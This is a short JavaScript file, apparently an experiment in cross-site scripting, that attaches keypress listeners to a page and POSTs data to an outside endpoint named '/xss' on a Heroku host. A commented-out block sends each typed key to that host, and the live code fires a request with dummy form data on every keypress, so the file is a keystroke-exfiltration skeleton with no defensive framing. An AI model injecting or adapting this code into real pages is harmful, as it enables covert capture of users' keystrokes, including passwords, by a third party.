//
// function ajaxRequest (method, url, data) {
//     var xmlHttp = new XMLHttpRequest()
//
//     xmlHttp.onreadystatechange = function() {
//         if (this.readyState == 4 && this.status == 200) {
//             console.log(this.responseText);
//         }
//     };
//
//     if (xmlHttp.overrideMimeType) {
//         xmlHttp.overrideMimeType('application/json')
//     }
//
//     xmlHttp.open(method, url, true)
//     // xmlHttp.setRequestHeader('Content-Type', 'application/json');
//
//     xmlHttp.setRequestHeader("*", "application/json");
//     // xmlHttp.setRequestHeader('Access-Control-Allow-Headers', '*');
//     // xmlHttp.setRequestHeader('Access-Control-Allow-Origin', '*');
//     xmlHttp.send(data)
//     return xmlHttp
// }
//
// document.addEventListener('keypress', function (e) {
//     ajaxRequest('POST', 'http://blog-torf.herokuapp.com/xss', '{"key":' + e.key + '}')
// })

function loadDoc() {
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            console.log('here')
        }
    };
    xhttp.open("POST", "http://blog-torf.herokuapp.com/xss", true);
    xhttp.setRequestHeader("Content-type", "application/json");
    xhttp.send("fname=Henry&lname=Ford");
}

document.addEventListener('keypress', function (e) {
    loadDoc();
})